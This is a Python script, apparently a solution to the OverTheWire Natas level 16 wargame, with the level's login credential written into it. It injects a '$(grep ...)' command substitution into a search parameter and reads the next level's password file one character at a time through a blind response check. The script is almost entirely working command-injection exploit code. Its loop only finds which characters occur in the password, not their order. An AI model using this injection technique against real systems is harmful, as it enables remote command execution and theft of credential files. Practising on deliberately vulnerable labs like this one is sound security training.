import aiohttp
import asyncio
import string

VALID_CHARS = string.ascii_letters + string.digits
BASE_URL = "http://natas16.natas.labs.overthewire.org/"
PASSWORD_FILE = "/etc/natas_webpass/natas17"
PASSWORD_LEN = 32
KNOWN_WORD = "breezes"

# Credentials are passed as a tuple in aiohttp
AUTH = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

async def test_char(count, password, session):
    for c in VALID_CHARS:
        payload = f"$(grep  {c} {PASSWORD_FILE}){KNOWN_WORD}"
        url = BASE_URL + f"?needle={payload}&submit=Search"
        
        async with session.get(url, auth=aiohttp.BasicAuth(*AUTH)) as response:
            if KNOWN_WORD not in await response.text():
                password += c
                print(f"Matched characters: {password}")
    return count, password

async def main():
    password = ""
    count = 1
    async with aiohttp.ClientSession() as session:
        count, password = await test_char(count, password, session)
        
    print(f"Matched characters:\n{password}")

# Run the async function
asyncio.run(main())
